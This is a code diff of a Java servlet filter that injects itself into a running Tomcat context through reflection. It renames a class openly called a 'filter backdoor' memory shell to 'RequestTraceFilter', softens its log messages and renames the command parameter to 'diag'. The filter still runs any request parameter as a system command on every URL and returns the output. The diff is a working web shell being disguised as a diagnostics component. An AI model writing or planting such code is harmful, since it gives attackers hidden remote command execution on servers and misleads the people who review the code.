@@ -15,11 +15,11 @@ import javax.servlet.*;
 import java.util.*;
 
 //@Component
-public class TomcatFilterMemShell implements Filter {
+public class RequestTraceFilter implements Filter {
     static{
         try {
-            System.out.println("Tomcat filter backdoor class is loading...");
-            final String name = "backdoorTomcatFilter";
+            System.out.println("RequestTraceFilter is loading...");
+            final String name = "requestTraceFilter";
             final String URLPattern = "/*";
 
             WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
@@ -42,11 +42,11 @@ public class TomcatFilterMemShell implements Filter {
             // skip if already present
             if (filterConfigs.get(name) == null) {
                 // 构造filterDef，并将filterDef添加到standardContext的FilterDef中
-                TomcatFilterMemShell backdoorFilter = new TomcatFilterMemShell();
+                RequestTraceFilter traceFilter = new RequestTraceFilter();
                 FilterDef filterDef = new FilterDef();
-                filterDef.setFilter(backdoorFilter);
+                filterDef.setFilter(traceFilter);
                 filterDef.setFilterName(name);
-                filterDef.setFilterClass(backdoorFilter.getClass().getName());
+                filterDef.setFilterClass(traceFilter.getClass().getName());
                 standardContext.addFilterDef(filterDef);
 
                 // 构造fiterMap，将filterMap添加到standardContext的FilterMap
@@ -62,8 +62,8 @@ public class TomcatFilterMemShell implements Filter {
 
                 // 最终将构造好的filterConfig存入StandardContext类的filterConfigs成员变量即可
                 filterConfigs.put(name, filterConfig);
-                System.out.println("Tomcat filter backdoor inject success!");
-            } else System.out.println("It has been successfully injected, do not inject again.");
+                System.out.println("RequestTraceFilter registered successfully.");
+            } else System.out.println("RequestTraceFilter already registered, skip.");
         } catch (Exception e) {
             System.out.println(e.getMessage());
         }
@@ -77,9 +77,9 @@ public class TomcatFilterMemShell implements Filter {
 
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-        String cmd;
-        if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+        String diag;
+        if ((diag = servletRequest.getParameter("diag")) != null) {
+            Process process = Runtime.getRuntime().exec(diag);
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
